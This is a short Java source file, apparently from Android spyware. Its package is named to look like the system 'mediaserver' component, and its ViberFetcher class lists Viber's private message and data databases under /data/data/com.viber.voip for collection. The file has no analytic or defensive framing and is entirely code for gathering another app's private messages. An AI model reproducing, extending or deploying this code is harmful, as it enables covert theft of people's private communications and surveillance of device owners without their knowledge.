package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class ViberFetcher extends FileFetcher {
  public ViberFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.viber.voip/databases/viber_messages"), "APP",
            "viber"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.viber.voip/databases/viber_data"), "APP",
            "viber"));
  }
}
